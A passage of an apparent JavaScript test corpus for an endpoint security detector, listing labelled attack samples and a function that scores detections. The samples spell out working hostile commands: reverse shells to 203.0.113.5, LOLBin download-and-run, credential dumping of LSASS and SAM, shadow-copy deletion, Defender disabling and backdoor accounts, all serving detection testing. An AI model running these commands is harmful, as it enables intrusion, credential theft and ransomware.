  attack('shadow-bcdedit-short', proc('bcdedit.exe /set recoveryenabled no'), 'shadow-copy-deletion', 'critical'),
  attack('shadow-wbadmin', proc('wbadmin.exe delete catalog -quiet'), 'shadow-copy-deletion', 'critical'),
  attack(
    'shadow-bcdedit-chain',
    proc(
      'cmd.exe /c "bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no"',
    ),
    'shadow-copy-deletion',
    'critical',
  ),
  attack(
    'shadow-cim',
    proc('powershell.exe Get-CimInstance Win32_ShadowCopy | Remove-CimInstance'),
    'shadow-copy-deletion',
    'critical',
  ),
  attack('shadow-reagentc', proc('reagentc.exe /disable'), 'shadow-copy-deletion', 'critical'),
  attack('shadow-caret', proc('cmd.exe /c v^s^s^a^d^m^i^n delete shadows /all'), 'shadow-copy-deletion', 'critical'),

  // ---------------------------------------------------------------- malicious: credential theft
  attack(
    'cred-mimikatz',
    proc('mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'),
    'credential-dumping',
    'critical',
  ),
  attack(
    'cred-comsvcs-ordinal',
    proc('rundll32.exe C:\\Windows\\System32\\comsvcs.dll, #+000024 624 C:\\Windows\\Temp\\x.dmp full'),
    'credential-dumping',
    'critical',
  ),
  attack('cred-procdump', proc('procdump64.exe -accepteula -ma lsass.exe out.dmp'), 'credential-dumping', 'critical'),
  attack('cred-reg-save-sam', proc('reg.exe save HKLM\\SAM C:\\temp\\sam.save'), 'credential-dumping', 'critical'),
  attack('cred-reg-export-security', proc('reg.exe export HKLM\\SECURITY sec.reg'), 'credential-dumping', 'critical'),
  attack(
    'cred-esentutl-ntds',
    proc('esentutl.exe /y /vss C:\\Windows\\ntds\\ntds.dit /d C:\\temp\\ntds.dit'),
    'credential-dumping',
    'critical',
  ),
  attack(
    'cred-shadow-copy-sam',
    proc(
      'cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\temp\\sam',
    ),
    'credential-dumping',
    'critical',
  ),
  attack(
    'cred-rdrleakdiag',
    proc('rdrleakdiag.exe /p 624 /o C:\\temp /fullmemdmp /wait 1'),
    'credential-dumping',
    'critical',
  ),
  attack('cred-lsass-read', lsass('C:\\Users\\Public\\x.exe', '0x1010'), 'credential-dumping', 'critical'),
  attack(
    'cred-lsass-fake-defender',
    lsass('C:\\Users\\amy\\AppData\\Local\\Temp\\MsMpEng.exe', '0x1fffff'),
    'credential-dumping',
    'critical',
    { why: 'a trusted name from an untrusted folder' },
  ),
  attack('cred-etc-shadow', lin('cat /etc/shadow'), 'credential-dumping', 'high'),
  attack(
    'cred-gpp-passwords',
    proc('findstr.exe /S /I cpassword \\\\corp.example\\sysvol\\corp.example\\policies\\*.xml'),
    'credential-dumping',
    'high',
  ),
  attack('cred-lazagne', proc('C:\\Users\\Public\\lazagne.exe all'), 'credential-dumping', 'critical'),

  // ---------------------------------------------------------------- malicious: built-in tools abused
  attack(
    'lol-certutil-download',
    proc('certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe'),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'lol-certutil-decode',
    proc('certutil.exe -decode C:\\Users\\Public\\a.txt C:\\Users\\Public\\a.exe'),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'lol-mshta-inline',
    proc('mshta.exe javascript:a=GetObject("script:http://203.0.113.5/y.sct")'),
    'lolbin-abuse',
    'high',
  ),
  attack('lol-mshta-remote', proc('mshta.exe https://203.0.113.5/a.hta'), 'lolbin-abuse', 'high'),
  attack(
    'lol-regsvr32-scriptlet',
    proc('regsvr32.exe /s /n /u /i:http://203.0.113.5/x.sct scrobj.dll'),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'lol-regsvr32-programdata',
    proc('regsvr32.exe /s C:\\ProgramData\\x.dat', { parents: ['wscript.exe', 'explorer.exe'] }),
    'lolbin-abuse',
    'high',
  ),
  attack('lol-rundll32-public', proc('rundll32.exe C:\\Users\\Public\\a.tmp,Start'), 'lolbin-abuse', 'high'),
  attack(
    'lol-rundll32-url-file',
    proc('rundll32.exe url.dll,FileProtocolHandler file://C:/Users/Public/x.hta'),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'lol-rundll32-shellexec',
    proc('rundll32.exe shell32.dll,ShellExec_RunDLL C:\\Users\\Public\\x.exe'),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'lol-rundll32-javascript',
    proc(
      'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://203.0.113.5/a")',
    ),
    'lolbin-abuse',
    'high',
  ),
  attack('lol-msiexec-remote', proc('msiexec.exe /q /i http://203.0.113.5/a.msi'), 'lolbin-abuse', 'high'),
  attack(
    'lol-bitsadmin',
    proc('bitsadmin.exe /transfer j http://203.0.113.5/a.exe C:\\Users\\Public\\a.exe'),
    'lolbin-abuse',
    'high',
  ),
  attack('lol-wmic-xsl', proc('wmic.exe os get /format:"https://203.0.113.5/a.xsl"'), 'lolbin-abuse', 'high'),
  attack('lol-cmstp', proc('cmstp.exe /ni /s C:\\Users\\Public\\a.inf'), 'lolbin-abuse', 'high'),
  attack('lol-msbuild-temp', proc('msbuild.exe C:\\Users\\amy\\AppData\\Local\\Temp\\p.xml'), 'lolbin-abuse', 'high'),
  attack(
    'lol-installutil',
    proc('InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\a.dll'),
    'lolbin-abuse',
    'high',
  ),
  attack('lol-mavinject', proc('mavinject.exe 4172 /INJECTRUNNING C:\\Users\\Public\\a.dll'), 'lolbin-abuse', 'high'),
  attack(
    'lol-curl-download-run',
    proc('cmd.exe /c curl.exe -s -o C:\\Users\\Public\\a.exe http://203.0.113.5/a.exe && C:\\Users\\Public\\a.exe'),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'lol-curl-pipe-bash',
    lin('curl -fsSL http://203.0.113.5/i.sh | sudo bash', { name: 'bash' }),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'lol-wget-chmod-run',
    lin('bash -c "wget -q http://203.0.113.5/x -O /tmp/x; chmod +x /tmp/x; /tmp/x"', { name: 'bash' }),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'lol-base64-pipe-sh',
    lin('sh -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuNS80NDQ0IDA+JjE= | base64 -d | sh"', { name: 'sh' }),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'lol-follina',
    proc(
      'msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression(\'[System.Text.Encoding]\'))))i/../../Windows/System32/mpsigstub.exe"',
    ),
    'lolbin-abuse',
    'high',
  ),
  attack(
    'script-from-downloads',
    proc('wscript.exe "C:\\Users\\amy\\Downloads\\Invoice_8841.js"'),
    'risky-script',
    'high',
  ),
  attack(
    'script-from-zip',
    proc('wscript.exe C:\\Users\\amy\\AppData\\Local\\Temp\\Temp1_scan.zip\\scan.vbs'),
    'risky-script',
    'high',
  ),
  attack('hta-from-roaming', proc('mshta.exe C:\\Users\\amy\\AppData\\Roaming\\a.hta'), 'risky-script', 'high'),

  // ---------------------------------------------------------------- malicious: disguised programs
  attack(
    'fake-svchost',
    proc('C:\\Users\\amy\\AppData\\Roaming\\svchost.exe', { path: 'C:\\Users\\amy\\AppData\\Roaming\\svchost.exe' }),
    'masquerading',
    'high',
  ),
  attack(
    'double-extension',
    proc('"C:\\Users\\amy\\Downloads\\Invoice.pdf.exe"', { path: 'C:\\Users\\amy\\Downloads\\Invoice.pdf.exe' }),
    'masquerading',
    'high',
  ),
  attack(
    'program-in-public',
    proc('C:\\Users\\Public\\update.exe', { path: 'C:\\Users\\Public\\update.exe' }),
    'masquerading',
    'high',
  ),
  attack('program-in-dev-shm', lin('/dev/shm/.x', { path: '/dev/shm/.x' }), 'masquerading', 'high'),
  attack(
    'program-in-recycle-bin',
    proc('C:\\$Recycle.Bin\\S-1-5-21-1\\a.exe', { path: 'C:\\$Recycle.Bin\\S-1-5-21-1\\a.exe' }),
    'masquerading',
    'high',
  ),

  // ---------------------------------------------------------------- malicious: documents and websites starting shells
  attack(
    'word-starts-shell',
    proc('cmd.exe /c powershell -w hidden', { parents: ['WINWORD.EXE', 'explorer.exe'] }),
    'office-spawned-shell',
    'high',
  ),
  attack(
    'excel-starts-mshta',
    proc('mshta.exe C:\\Users\\amy\\AppData\\Local\\Temp\\a.hta', { parents: ['EXCEL.EXE'] }),
    'office-spawned-shell',
    'high',
  ),
  attack('iis-webshell', proc('cmd.exe /c whoami', { parents: ['w3wp.exe'] }), 'webshell', 'high'),
  attack(
    'php-webshell-recon',
    lin('sh -c "id; uname -a"', { name: 'sh', parents: ['php-fpm8.3'] }),
    'webshell',
    'high',
  ),
  attack(
    'apache-webshell-download',
    lin('sh -c "curl http://203.0.113.5/s.sh | sh"', { name: 'sh', parents: ['apache2'] }),
    'webshell',
    'critical',
  ),

  // ---------------------------------------------------------------- malicious: remote shells and miners
  attack(
    'revshell-bash',
    lin('bash -i >& /dev/tcp/203.0.113.5/4444 0>&1', { name: 'bash' }),
    'reverse-shell',
    'critical',
  ),
  attack('revshell-nc', lin('nc 203.0.113.5 4444 -e /bin/sh'), 'reverse-shell', 'critical'),
  attack(
    'revshell-python',
    lin(
      'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("203.0.113.5",4444));os.dup2(s.fileno(),0);subprocess.call(["/bin/sh","-i"])\'',
    ),
    'reverse-shell',
    'critical',
  ),
  attack(
    'revshell-mkfifo',
    lin('sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.5 4444 >/tmp/f"', { name: 'sh' }),
    'reverse-shell',
    'critical',
  ),
  attack('revshell-nc-windows', proc('nc.exe 203.0.113.5 4444 -e cmd.exe'), 'reverse-shell', 'critical'),
  attack(
    'revshell-socat',
    lin('socat TCP:203.0.113.5:4444 EXEC:/bin/bash,pty,stderr,setsid'),
    'reverse-shell',
    'critical',
  ),
  attack(
    'miner-xmrig',
    lin('/tmp/.x/xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 4AdUndXHHZ --donate-level 1', {
      path: '/tmp/.x/xmrig',
    }),
    'cryptominer',
    'high',
  ),

  // ---------------------------------------------------------------- malicious: moving to other machines
  attack('lateral-psexec', proc('PsExec64.exe \\\\FILESRV -s cmd.exe'), 'lateral-movement', 'high'),
  attack(
    'lateral-wmic-node',
    proc('wmic.exe /node:10.0.0.5 process call create "cmd /c whoami"'),
    'lateral-movement',
    'high',
  ),
  attack(
    'lateral-ps-remoting',
    proc('powershell.exe Invoke-Command -ComputerName DC01 -ScriptBlock {whoami}'),
    'lateral-movement',
    'high',
  ),
  attack(
    'lateral-remote-service',
    proc('sc.exe \\\\FILESRV create upd binPath= "cmd /c C:\\Users\\Public\\a.exe"'),
    'lateral-movement',
    'high',
  ),
  attack(
    'lateral-remote-task',
    proc('schtasks.exe /create /s FILESRV /tn upd /tr C:\\Users\\Public\\a.exe /ru system'),
    'lateral-movement',
    'high',
  ),
  attack(
    'lateral-wmiexec',
    proc('cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1700000000.12 2>&1'),
    'lateral-movement',
    'high',
  ),
  attack('lateral-psexesvc', autostart('service', 'PSEXESVC', 'C:\\Windows\\PSEXESVC.exe'), 'lateral-movement', 'high'),
  attack(
    'lateral-rdp-spread',
    ['A', 'B', 'C'].map((h, i) => ({
      id: `cr${i}`,
      type: 'logon',
      at: T0 + i * 60_000,
      host: { id: `gag_rdp${h}`, name: h, os: 'windows' },
      logon: { type: 'rdp', source: '10.0.0.66', user: 'admin' },
    })),
    'rdp-spread',
    'high',
  ),

  // ---------------------------------------------------------------- malicious: switching protection off
  attack(
    'evade-defender-off',
    proc('powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true'),
    'defense-evasion',
    'high',
  ),
  attack(
    'evade-defender-off-colon',
    proc('powershell.exe Set-MpPreference -DisableRealtimeMonitoring:$true'),
    'defense-evasion',
    'high',
  ),
  attack(
    'evade-exclude-public',
    proc('powershell.exe Add-MpPreference -ExclusionPath C:\\Users\\Public'),
    'defense-evasion',
    'high',
  ),
  attack(
    'evade-exclude-exe',
    proc('powershell.exe Add-MpPreference -ExclusionExtension exe'),
    'defense-evasion',
    'high',
  ),
  attack('evade-sc-stop-defender', proc('sc.exe stop WinDefend'), 'defense-evasion', 'high'),
  attack('evade-net-stop-defender', proc('net.exe stop windefend'), 'defense-evasion', 'high'),
  attack('evade-kill-defender', proc('taskkill.exe /f /im MsMpEng.exe'), 'defense-evasion', 'high'),
  attack(
    'evade-registry-defender',
    proc(
      'reg.exe add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
    ),
    'defense-evasion',
    'high',
  ),
  attack('evade-clear-log', proc('wevtutil.exe cl Security'), 'defense-evasion', 'high'),
  attack('evade-firewall-off', proc('netsh.exe advfirewall set allprofiles state off'), 'defense-evasion', 'high'),
  attack('evade-stop-guard', proc('sc.exe stop SecurovixGuard'), 'defense-evasion', 'high'),
  attack('evade-stop-guard-linux', lin('systemctl stop securovix-guard'), 'defense-evasion', 'high'),
  attack('evade-kill-guard', proc('taskkill.exe /f /im securovix-guard.exe'), 'defense-evasion', 'high'),
  attack(
    'evade-wipe-history',
    lin('bash -c "history -c && rm ~/.bash_history"', { name: 'bash' }),
    'defense-evasion',
    'high',
  ),
  attack('evade-flush-firewall', lin('iptables -F'), 'defense-evasion', 'high'),
  attack('evade-delete-journal', proc('fsutil.exe usn deletejournal /d C:'), 'defense-evasion', 'high'),
  attack(
    'evade-audit-off',
    proc('auditpol.exe /set /category:* /success:disable /failure:disable'),
    'defense-evasion',
    'high',
  ),
  attack('evade-safeboot', proc('bcdedit.exe /set safeboot network'), 'defense-evasion', 'high'),

  // ---------------------------------------------------------------- malicious: staying on the machine
  attack(
    'persist-roaming-unsigned',
    autostart('run-key', 'Updater', 'C:\\Users\\amy\\AppData\\Roaming\\upd.exe -silent', {
      signer: { status: 'unsigned' },
    }),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-roaming-no-info',
    autostart('run-key', 'Updater', 'C:\\Users\\amy\\AppData\\Roaming\\upd.exe'),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-local-unsigned',
    autostart('run-key', 'Sync', 'C:\\Users\\amy\\AppData\\Local\\sync\\sync.exe', { signer: { status: 'unsigned' } }),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-wscript-roaming',
    autostart('run-key', 'Startup', 'wscript.exe "C:\\Users\\amy\\AppData\\Roaming\\a.vbs"'),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-task-encoded-cradle',
    autostart('scheduled-task', '\\Updater', `powershell.exe -w hidden -enc ${enc(CRADLE)}`),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-service-public',
    autostart('service', 'WinUpd', 'C:\\Users\\Public\\svc.exe'),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-task-temp',
    autostart('scheduled-task', '\\Sync', 'C:\\Users\\amy\\AppData\\Local\\Temp\\a.exe', {
      signer: { status: 'unsigned' },
    }),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-rundll32-programdata',
    autostart('run-key', 'Helper', 'rundll32.exe C:\\ProgramData\\x.dat,Start'),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-cron-download',
    autostart('cron', 'x', '* * * * * curl http://203.0.113.5/x | sh', { host: LIN, path: '/etc/cron.d/x' }),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-cron-tmp',
    autostart('cron', 'root', '@reboot /tmp/.x/kworker', { host: LIN, path: '/var/spool/cron/crontabs/root' }),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-systemd-revshell',
    autostart('systemd', 'dbus-helper.service', '/bin/bash -c "bash -i >& /dev/tcp/203.0.113.5/4444 0>&1"', {
      host: LIN,
      path: '/etc/systemd/system/dbus-helper.service',
    }),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-cron-second-line',
    autostart('cron', 'maintenance', '0 3 * * * root /usr/local/bin/backup.sh\n*/10 * * * * root /var/tmp/.cache/upd', {
      host: LIN,
      path: '/etc/cron.d/maintenance',
    }),
    'persistence-created',
    'high',
    { why: 'the hostile job is not the first line of the file' },
  ),
  attack(
    'persist-ld-preload-file',
    autostart('ld-preload', 'ld.so.preload', '/usr/local/lib/libprocesshider.so', {
      host: LIN,
      path: '/etc/ld.so.preload',
    }),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-startup-folder-exe',
    autostart(
      'startup-folder',
      'update.exe',
      'C:\\Users\\amy\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe',
      { signer: { status: 'unsigned' } },
    ),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-startup-shortcut-to-temp',
    autostart('startup-folder', 'Sync.lnk', 'C:\\Users\\amy\\AppData\\Local\\Temp\\sync.exe -q'),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-schtasks-hidden-ps',
    proc('schtasks.exe /create /sc minute /tn x /tr "powershell -w hidden -f C:\\Users\\Public\\x.ps1"'),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-reg-run-roaming',
    proc(
      'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Users\\amy\\AppData\\Roaming\\upd.exe /f',
    ),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-sticky-keys-ifeo',
    proc(
      'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /d "C:\\Windows\\System32\\cmd.exe" /f',
    ),
    'persistence-created',
    'critical',
  ),
  attack(
    'persist-sticky-keys-copy',
    proc('cmd.exe /c copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe'),
    'persistence-created',
    'critical',
  ),
  attack(
    'persist-wmi-subscription',
    proc(
      'powershell.exe Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name="upd";CommandLineTemplate="C:\\Users\\Public\\a.exe"}',
    ),
    'persistence-created',
    'high',
  ),
  attack('persist-new-admin', proc('net.exe localgroup administrators backdoor /add'), 'persistence-created', 'high'),
  attack('persist-root-account', lin('useradd -o -u 0 -g 0 sysadm'), 'persistence-created', 'high'),
  attack(
    'persist-ld-preload',
    lin('sh -c "echo /tmp/x.so > /etc/ld.so.preload"', { name: 'sh' }),
    'persistence-created',
    'high',
  ),
  attack(
    'persist-startup-folder',
    proc(
      'cmd.exe /c copy C:\\Users\\Public\\a.exe "C:\\Users\\amy\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\a.exe"',
    ),
    'persistence-created',
    'high',
  ),

  // ---------------------------------------------------------------- malicious: ransomware at work
  attack(
    'ransom-canary-renamed',
    [
      {
        id: 'cc1',
        type: 'canary.touched',
        at: T0,
        host: WIN,
        file: { path: 'C:\\Users\\amy\\Documents\\0000-securovix-canary.docx' },
        detail: { change: 'renamed', killed: false },
      },
    ],
    'canary-touched',
    'critical',
  ),
  attack(
    'ransom-canary-deleted-stopped',
    [
      {
        id: 'cc2',
        type: 'canary.touched',
        at: T0,
        host: WIN,
        file: { path: 'C:\\Users\\amy\\Documents\\0000-securovix-canary.docx' },
        process: { pid: 666, name: 'lock.exe' },
        detail: { change: 'deleted', killed: true },
      },
    ],
    'canary-touched',
    'critical',
  ),
  attack(
    'ransom-agent-verdict',
    [
      {
        id: 'cc3',
        type: 'ransomware.detected',
        at: T0,
        host: WIN,
        file: { path: 'C:\\Users\\amy\\Documents\\q3.xlsx.locked', oldPath: 'C:\\Users\\amy\\Documents\\q3.xlsx' },
        detail: {
          reason: '20 files renamed to ".locked" within 30 seconds',
          files: 20,
          killed: true,
          pid: 666,
          process: 'lock.exe',
        },
      },
    ],
    'ransomware-behaviour',
    'critical',
  ),
  attack(
    'ransom-rename-appended',
    files('file.rename', 20, (i) => ({
      oldPath: `C:\\Users\\amy\\Documents\\f${i}.docx`,
      path: `C:\\Users\\amy\\Documents\\f${i}.docx.locked`,
    })),
    'ransomware-behaviour',
    'critical',
  ),
  attack(
    'ransom-rename-random-extensions',
    files('file.rename', 25, (i) => ({
      oldPath: `C:\\Users\\amy\\Documents\\f${i}.xlsx`,
      path: `C:\\Users\\amy\\Documents\\f${i}.${hex(i).slice(0, 5)}`,
    })),
    'ransomware-behaviour',
    'critical',
    { why: 'a different extension for every file' },
  ),
  attack(
    'ransom-documents-rewritten',
    files('file.write', 30, (i) => ({
      path: `C:\\Users\\amy\\Documents\\budget-${i}.${i % 2 ? 'xlsx' : 'docx'}`,
      entropy: 7.96,
    })),
    'ransomware-behaviour',
    'critical',
  ),
  attack(
    'ransom-encrypted-copies',
    files('file.write', 30, (i) => ({ path: `C:\\Users\\amy\\Documents\\report-${i}.docx.crypt`, entropy: 7.98 })),
    'ransomware-behaviour',
    'critical',
  ),
  attack(
    'known-malware-hash',
    proc('"C:\\Users\\amy\\Downloads\\tool.exe"', { path: 'C:\\Users\\amy\\Downloads\\tool.exe' }),
    'malicious-file',
    'critical',
    { sha256: 'a'.repeat(64) },
  ),

  // ---------------------------------------------------------------- malicious: Guard itself
  attack(
    'guard-uninstalled',
    [{ id: 'ct1', type: 'agent.tamper', at: T0, host: WIN, detail: { reason: 'the agent is being uninstalled' } }],
    'agent-tamper',
    'high',
  ),
  {
    id: 'server-silent',
    label: 'malicious',
    expect: { rule: 'agent-offline', min: 'medium' },
    stale: {
      agents: [{ id: LIN.id, hostname: 'web-01', os: 'linux', status: 'active', lastSeenAt: T0 - 20 * 60_000 }],
    },
  },
  {
    id: 'windows-server-silent',
    label: 'malicious',
    expect: { rule: 'agent-offline', min: 'medium' },
    stale: {
      agents: [
        {
          id: WIN.id,
          hostname: 'DC01',
          os: 'windows',
          osVersion: 'Windows Server 2022 Standard',
          status: 'active',
          lastSeenAt: T0 - 20 * 60_000,
        },
      ],
    },
  },

  // ---------------------------------------------------------------- policy: reported on purpose
  policy(
    'installer-run-from-memory',
    proc('powershell -c "irm https://get.scoop.sh | iex"', { name: 'powershell.exe' }),
    'encoded-powershell',
    'high',
    'high',
    'the same act as a paste-this-command attack: code from the internet run without being saved',
  ),
  policy(
    'installer-piped-to-shell',
    lin('sh -c "curl -fsSL https://get.docker.com | sh"', { name: 'sh' }),
    'lolbin-abuse',
    'medium',
    'medium',
    'a named HTTPS site: probably an install, worth a look',
  ),
  policy(
    'defender-exclusion-work-folder',
    proc('powershell.exe Add-MpPreference -ExclusionPath C:\\dev\\project'),
    'defense-evasion',
    'medium',
    'medium',
    'a security setting was weakened, for one folder',
  ),
  policy(
    'script-from-desktop',
    proc('wscript.exe C:\\Users\\amy\\Desktop\\rename-files.vbs'),
    'risky-script',
    'medium',
    'medium',
    "could be the person's own script",
  ),
  policy(
    'autostart-unverified-publisher',
    autostart('run-key', 'Notes', 'C:\\Users\\amy\\AppData\\Local\\Notes\\notes.exe'),
    'persistence-created',
    'medium',
    'medium',
    'agent 0.1.1 does not report who signed a program',
  ),
  policy(
    'cron-from-home',
    autostart('cron', 'deploy', '*/5 * * * * /home/deploy/app/healthcheck.sh', {
      host: LIN,
      path: '/var/spool/cron/crontabs/deploy',
    }),
    'persistence-created',
    'medium',
    'medium',
    'a new scheduled job outside the system folders',
  ),
  policy(
    'canary-deleted-by-hand',
    [
      {
        id: 'cp1',
        type: 'canary.touched',
        at: T0,
        host: WIN,
        file: { path: 'C:\\Users\\amy\\Downloads\\0000-securovix-canary.docx' },
        detail: { change: 'deleted', killed: false },
      },
    ],
    'canary-touched',
    'high',
    'high',
    'someone may have cleared the folder',
  ),
  policy(
    'old-agent-unknown-type-verdict',
    [
      {
        id: 'cp2',
        type: 'ransomware.detected',
        at: T0,
        host: WIN,
        file: { path: 'C:\\Users\\amy\\Documents\\vault\\store.kdbx' },
        detail: {
          reason: '30 files rewritten with encrypted-looking content within 30 seconds',
          files: 30,
          killed: false,
        },
      },
    ],
    'ransomware-behaviour',
    'medium',
    'medium',
    'agent 0.1.1 cannot tell a new compressed file from an encrypted document',
  ),
  policy(
    'admin-psexec',
    proc('PsExec64.exe \\\\FILESRV -s ipconfig'),
    'lateral-movement',
    'high',
    'high',
    'admins do this; so does every intruder',
  ),
];

export const SEVERITIES = ['info', 'low', 'medium', 'high', 'critical'];

/**
 * Runs every sample through a detection module and scores it.
 * @param {{ detectEndpoint: Function, staleAgentAlerts: Function }} detector
 */
export function scoreCorpus(detector, corpus = CORPUS) {
  const rank = (s) => SEVERITIES.indexOf(s);
  const results = [];
  for (const sample of corpus) {
    let alerts;
    try {
      if (sample.stale)
        alerts = detector.staleAgentAlerts(sample.stale.agents, {
          orgId: 'org_corpus',
          now: T0,
          hosts: sample.stale.hosts || {},
          expectOnline: sample.stale.expectOnline || {},
        });
      else
        alerts = detector.detectEndpoint(structuredClone(sample.events), {
          orgId: 'org_corpus',
          hashes: sample.sha256 ? new Map([[sample.sha256, { family: 'TestFamily' }]]) : new Map(),
        }).alerts;
    } catch (error) {
      results.push({ sample, ok: false, got: `threw: ${error.message}` });
      continue;
    }
    if (sample.sha256) {
      // The hash rides on the first event of the sample.
      const withHash = structuredClone(sample.events);
      withHash[0].process.sha256 = sample.sha256;
      alerts = detector.detectEndpoint(withHash, {
        orgId: 'org_corpus',
        hashes: new Map([[sample.sha256, { family: 'TestFamily' }]]),
      }).alerts;
    }
    const got = alerts.map((a) => `${a.rule}:${a.severity}`).join(', ') || 'no alert';
    let ok;
    if (sample.label === 'benign') ok = alerts.length === 0;
    else {
      const hit = alerts.filter((a) => a.rule === sample.expect.rule);
      const top = hit.reduce((m, a) => Math.max(m, rank(a.severity)), -1);
      ok = top >= rank(sample.expect.min);
      if (ok && sample.expect.max) ok = alerts.every((a) => rank(a.severity) <= rank(sample.expect.max));
    }
    results.push({ sample, ok, got });
  }
  const of = (label) => results.filter((r) => r.sample.label === label);
  const failed = (label) => of(label).filter((r) => !r.ok);
  return {
    results,
    benign: { total: of('benign').length, falsePositives: failed('benign') },
    malicious: { total: of('malicious').length, falseNegatives: failed('malicious') },
    policy: { total: of('policy').length, wrong: failed('policy') },
  };
}
